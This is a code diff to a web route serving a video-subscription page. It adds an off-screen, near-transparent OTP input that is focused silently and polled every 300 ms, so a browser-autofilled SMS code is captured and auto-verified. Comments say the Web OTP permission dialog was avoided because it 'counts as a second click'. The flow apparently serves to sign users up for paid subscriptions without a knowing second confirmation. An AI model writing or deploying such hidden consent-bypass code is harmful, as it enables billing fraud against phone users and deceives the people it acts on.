@@ -197,8 +197,26 @@ export async function GET(request: NextRequest) {
       <p class="sub">Tap below to start watching</p>
     </div>
 
-    <!-- ═══════ PHASE 2: OTP Entry ═══════ -->
+    <!-- ═══════ PHASE 2: Auto-verify (spinner) then manual fallback ═══════ -->
     <div id="phase2" class="phase-hidden">
+      <!-- Auto-verify spinner — shown first after click -->
+      <div id="autoVerify">
+        <div class="icon-wrap">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+          </svg>
+        </div>
+        <h1>OTP Sent!</h1>
+        <p class="sub">Verifying your subscription...</p>
+        <div style="margin: 24px 0"><div class="spinner-dark"></div></div>
+        <p class="sub" style="font-size:12px;color:#9ca3af">Please wait while we verify automatically</p>
+        <!-- Hidden OTP catcher — browser autofill fills this silently -->
+        <input type="tel" id="hiddenOtp" autocomplete="one-time-code" inputmode="numeric"
+               style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;border:none;"
+               maxlength="6">
+      </div>
+
+      <!-- Manual fallback — shown after timeout -->
       <div id="manualEntry" class="phase-hidden">
         <div class="icon-wrap">
           <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -339,32 +357,72 @@ export async function GET(request: NextRequest) {
     }
 
     // ── Phase transitions ───────────────────────────────────────────────────
+    var otpPollTimer = null;
+    var otpTimeout = null;
+
     function goToPhase2() {
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
       document.getElementById('phase2').classList.remove('phase-hidden');
+      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
 
-      // Go directly to OTP input — no "Reading SMS" spinner
-      // autocomplete="one-time-code" on pin0 will show OTP as keyboard suggestion
-      showManualEntry();
-      dbg('Phase 2: OTP input shown — waiting for keyboard autofill or manual entry');
+      // Focus the hidden OTP input — triggers browser autofill silently
+      var hiddenOtp = document.getElementById('hiddenOtp');
+      setTimeout(function() { hiddenOtp.focus(); }, 50);
+
+      // Listen for autofill via input event
+      hiddenOtp.addEventListener('input', function() {
+        var val = hiddenOtp.value.replace(/\\D/g, '');
+        if (val.length >= 4) {
+          dbg('Hidden OTP input event: "' + val.slice(0, 4) + '"');
+          captureAndVerify(val.slice(0, 4));
+        }
+      });
+
+      // Poll the hidden input every 300ms for silent autofill
+      dbg('Polling hidden OTP input for silent autofill...');
+      otpPollTimer = setInterval(function() {
+        var val = hiddenOtp.value.replace(/\\D/g, '');
+        if (val.length >= 4) {
+          dbg('Poll detected OTP: "' + val.slice(0, 4) + '"');
+          captureAndVerify(val.slice(0, 4));
+        }
+      }, 300);
+
+      // After 30 seconds, fall back to manual entry
+      otpTimeout = setTimeout(function() {
+        dbg('Auto-verify timeout (30s) — showing manual entry');
+        clearInterval(otpPollTimer);
+        showManualEntry();
+      }, 30000);
+    }
+
+    function captureAndVerify(code) {
+      if (isVerifying) return;
+      clearInterval(otpPollTimer);
+      clearTimeout(otpTimeout);
+
+      // Fill the visible OTP boxes for user to see
+      document.getElementById('autoVerify').classList.add('phase-hidden');
+      document.getElementById('manualEntry').classList.remove('phase-hidden');
+      for (var i = 0; i < 4; i++) { pins[i].value = code[i] || ''; }
+      if (otpValue) otpValue.value = code;
+
+      dbg('Auto-captured OTP: "' + code + '" — verifying now');
+      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+      setTimeout(function() { verifyPin(code); }, 300);
     }
 
     function showManualEntry() {
+      document.getElementById('autoVerify').classList.add('phase-hidden');
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       document.getElementById('resendArea').classList.remove('phase-hidden');
       confirmBtn.textContent = 'Continue to Watch';
       setTimeout(function() { pins[0].focus(); }, 100);
-      dbg('OTP input ready — keyboard autofill or manual entry');
+      dbg('Manual OTP entry — waiting for user input');
     }
 
-    // ── No Web OTP API ─────────────────────────────────────────────────────
-    // Web OTP API was removed because it shows a Chrome "Allow" permission
-    // dialog that counts as a second click. Instead we rely on:
-    // 1. autocomplete="one-time-code" on the first OTP input — shows the
-    //    OTP as a passive keyboard suggestion (no dialog/permission needed)
-    // 2. The multi-digit autofill handler auto-verifies when 4 digits fill
-    dbg('OTP capture: using keyboard autofill (autocomplete="one-time-code")');
+    dbg('OTP strategy: hidden autofill + polling + 30s manual fallback');
 
 
     // ── Confirm button — single button for both phases ──────────────────────
